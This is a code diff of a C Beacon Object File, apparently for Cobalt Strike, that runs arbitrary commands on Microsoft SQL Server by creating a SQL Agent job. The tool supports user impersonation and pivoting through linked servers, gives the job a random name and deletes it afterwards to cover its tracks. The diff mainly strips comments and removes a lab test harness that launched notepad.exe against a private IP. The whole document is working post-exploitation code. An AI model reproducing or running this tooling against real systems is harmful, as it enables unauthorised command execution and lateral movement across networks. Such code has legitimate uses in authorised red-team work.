@@ -4,9 +4,7 @@
 #include "sql_agent.c"
 #include "sql_modules.c"
 
-void ExecuteAgentCommand(char *server, char *database, char *link,
-                         char *impersonate, char *command, char *user,
-                         char *password) {
+void ExecuteAgentCommand(char *server, char *database, char *link, char *impersonate, char *command, char *user, char *password) {
   SQLHENV env = NULL;
   SQLHSTMT stmt = NULL;
   SQLHDBC dbc = NULL;
@@ -27,22 +25,15 @@ void ExecuteAgentCommand(char *server, char *database, char *link,
   if (link == NULL) {
     internal_printf("[*] Executing command in SQL Agent job on %s\n\n", server);
   } else {
-    internal_printf("[*] Executing command in SQL Agent job on %s via %s\n\n",
-                    link, server);
+    internal_printf("[*] Executing command in SQL Agent job on %s via %s\n\n", link, server);
   }
 
-  //
-  // allocate statement handle
-  //
   ret = ODBC32$SQLAllocHandle(SQL_HANDLE_STMT, dbc, &stmt);
   if (!SQL_SUCCEEDED(ret)) {
     internal_printf("[!] Failed to allocate statement handle\n");
     goto END;
   }
 
-  //
-  // if using linked server, ensure rpc is enabled
-  //
   if (link != NULL) {
     if (IsRpcEnabled(stmt, link)) {
       internal_printf("[*] RPC out is enabled\n");
@@ -51,9 +42,6 @@ void ExecuteAgentCommand(char *server, char *database, char *link,
       goto END;
     }
 
-    //
-    // close the cursor
-    //
     ODBC32$SQLCloseCursor(stmt);
   }
 
@@ -62,9 +50,6 @@ void ExecuteAgentCommand(char *server, char *database, char *link,
     goto END;
   }
 
-  //
-  // Close the cursor
-  //
   ret = ODBC32$SQLCloseCursor(stmt);
   if (!SQL_SUCCEEDED(ret)) {
     internal_printf("[!] Failed to close cursor\n");
@@ -73,9 +58,6 @@ void ExecuteAgentCommand(char *server, char *database, char *link,
 
   internal_printf("[*] SQL Agent is running\n");
 
-  //
-  // Add agent job
-  //
   InitRandomSeed();
   jobName = GenerateRandomString(8);
   stepName = GenerateRandomString(8);
@@ -88,9 +70,6 @@ void ExecuteAgentCommand(char *server, char *database, char *link,
   ClearCursor(stmt);
   internal_printf("[*] Added job\n");
 
-  //
-  // Print jobs to verify job was added
-  //
   if (!GetAgentJobs(stmt, link, impersonate)) {
     internal_printf("[!] Failed to get agent jobs\n");
     goto END;
@@ -99,9 +78,6 @@ void ExecuteAgentCommand(char *server, char *database, char *link,
   internal_printf("\n");
   PrintQueryResults(stmt, TRUE);
 
-  //
-  // Close the cursor
-  //
   ret = ODBC32$SQLCloseCursor(stmt);
   if (!SQL_SUCCEEDED(ret)) {
     internal_printf("[!] Failed to close cursor\n");
@@ -113,9 +89,6 @@ void ExecuteAgentCommand(char *server, char *database, char *link,
 
   ClearCursor(stmt);
 
-  //
-  // Cleanup job
-  //
   if (!DeleteAgentJob(stmt, link, impersonate, jobName)) {
     internal_printf("[!] Failed to delete agent job\n");
     goto END;
@@ -125,9 +98,6 @@ void ExecuteAgentCommand(char *server, char *database, char *link,
 
   ClearCursor(stmt);
 
-  //
-  // Print jobs to verify job was added
-  //
   if (!GetAgentJobs(stmt, link, impersonate)) {
     internal_printf("[!] Failed to get agent jobs\n");
     goto END;
@@ -145,7 +115,6 @@ END:
   DisconnectSqlServer(env, dbc, stmt);
 }
 
-#ifdef BOF
 VOID go(IN PCHAR Buffer, IN ULONG Length) {
   char *server;
   char *database;
@@ -155,9 +124,6 @@ VOID go(IN PCHAR Buffer, IN ULONG Length) {
   char *user;
   char *password;
 
-  //
-  // parse beacon args
-  //
   datap parser;
   BeaconDataParse(&parser, Buffer, Length);
 
@@ -184,29 +150,7 @@ VOID go(IN PCHAR Buffer, IN ULONG Length) {
     return;
   }
 
-  ExecuteAgentCommand(server, database, link, impersonate, command, user,
-                      password);
+  ExecuteAgentCommand(server, database, link, impersonate, command, user, password);
 
   printoutput(TRUE);
 };
-
-#else
-
-int main() {
-  //
-  // GOAD uses SQLExpress so turning to makeshift lab here
-  //
-  internal_printf("============ BASE TEST ============\n\n");
-  ExecuteAgentCommand("192.168.0.215", "master", NULL, NULL, "notepad.exe",
-                      NULL, NULL);
-
-  internal_printf("\n\n============ IMPERSONATE TEST ============\n\n");
-  ExecuteAgentCommand("192.168.0.215", "master", NULL, "sa", "notepad.exe",
-                      NULL, NULL);
-
-  internal_printf("\n\n============ LINK TEST ============\n\n");
-  ExecuteAgentCommand("192.168.0.215", "master", "TRETOGOR", NULL,
-                      "notepad.exe", NULL, NULL);
-}
-
-#endif
